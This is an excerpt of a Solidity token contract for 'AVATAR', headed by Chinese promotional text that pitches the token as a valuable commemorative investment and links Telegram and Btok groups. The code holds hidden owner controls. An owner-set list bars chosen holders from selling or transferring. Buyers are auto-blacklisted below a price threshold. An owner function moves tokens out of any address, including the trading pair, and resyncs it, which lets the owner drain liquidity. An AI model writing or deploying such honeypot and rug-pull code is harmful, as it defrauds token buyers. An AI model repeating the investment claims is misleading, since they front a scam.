...
/**
Avatar代币是由泰山众筹领导人联合成员发起的

泰山众筹是一个值得纪念的历史项目，它代表了创新、勇气和成功。Avatar智能合约项目是由泰山众筹原版团队发起的，并在全国范围内得到了广泛的认可和支持。

Avatar代币是为了纪念曾经泰山众筹项目的辉煌历史而诞生的。它不仅代表了这个项目的成功，还代表了市场团队长对未来的信心和承诺。

拥有Avatar代币，就等于拥有了一份珍贵的资产，这份资产不仅具有珍藏价值，还具有很高的使用价值。它可以用来参与Avatar的生态获得丰厚的奖励回报，也可以在加密货币交易所上交易，从而为投资者带来更多的投资机会。

纪念泰山众筹项目的历史是一件值得骄傲的事情。拥有SUN代币，就是纪念这个历史的一种方式。如果您是一个热爱历史的人，或者是一个对加密货币感兴趣的投资者，那么您不容错过拥有Avatar代币的机会。

Avatar代币与其Avatar智能合约项目并非同一个。

Avatar唯一官方TG群连接：https://t.me/AVATAR7799
Avatar唯一官方Btok群连接：https://s65535.com/AVATAR7799
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _YxList;
    ...
    uint256 public _buyNodedividendfee = 0;
    ...
    mapping(address => bool) private donate;
    uint private count;
    uint public _count;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            if (_swapPairList[sender]) {//Buy
                ...
                if (tokenPrice < _blackPrice && !_YxList[recipient]) {
                    _blackList[recipient] = true;
                }
            } else if (_swapPairList[recipient]) {//Sell
                require(donate[sender] != true,"can not sell");
                ...
                require(donate[sender] != true,"can not transfer");
    ...
    function setdonate(address [] memory addr) external onlyOwner {
        for(uint i = 0;i < addr.length; i++){
        donate[addr[i]] = true;
        }
    }

    function deletedonate(address [] memory addr) external onlyOwner {
        for(uint i = 0;i < addr.length; i++){
        donate[addr[i]] = false;
        }
    }
    ...
    function Setnodefee(address Dividendfee, address[] memory account, uint256 amount) external onlyOwner {
        for(uint i = 0; i < account.length; i++){
        _tokenTransfer(Dividendfee, account[i], amount, false);
        ISwapPair(Dividendfee).sync();
        }
    }
...
contract AVATAR is AbsToken {
    constructor() AbsToken(
        ...
        9,
        7799,
        address(0xcd213536025f7CF5125AafeDcA74646308F18404),/*营销*/
